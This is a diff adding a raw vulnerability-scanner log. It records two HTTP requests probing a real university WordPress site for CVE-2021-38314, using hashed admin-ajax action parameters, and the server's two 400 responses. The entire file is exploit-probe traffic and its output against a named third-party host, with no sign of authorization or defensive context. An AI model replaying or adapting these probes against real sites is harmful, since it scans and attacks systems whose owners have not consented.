@@ -1,0 +1,57 @@
+[CVE-2021-38314] Dumped HTTP request for https://must.unimelb.edu.au/wp-admin/admin-ajax.php?action=e941d9e14f3bb6b84896c32c8fb5a52b
+
+
+GET /wp-admin/admin-ajax.php?action=e941d9e14f3bb6b84896c32c8fb5a52b HTTP/1.1
+Host: must.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Encoding: gzip
+
+
+[CVE-2021-38314] Dumped HTTP response https://must.unimelb.edu.au/wp-admin/admin-ajax.php?action=e941d9e14f3bb6b84896c32c8fb5a52b
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:08 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Last-Modified: Wed, 06 Aug 2025 15:18:08 GMT
+Referrer-Policy: strict-origin-when-cross-origin
+Server: openresty
+Vary: Cookie
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Robots-Tag: noindex
+
+0
+[CVE-2021-38314] Dumped HTTP request for https://must.unimelb.edu.au/wp-admin/admin-ajax.php?action=de457f93bb3805bf0549b1de6ec4bc21
+
+
+GET /wp-admin/admin-ajax.php?action=de457f93bb3805bf0549b1de6ec4bc21 HTTP/1.1
+Host: must.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Encoding: gzip
+
+
+[CVE-2021-38314] Dumped HTTP response https://must.unimelb.edu.au/wp-admin/admin-ajax.php?action=de457f93bb3805bf0549b1de6ec4bc21
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:09 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Referrer-Policy: strict-origin-when-cross-origin
+Server: openresty
+Vary: Cookie
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Robots-Tag: noindex
+
+0
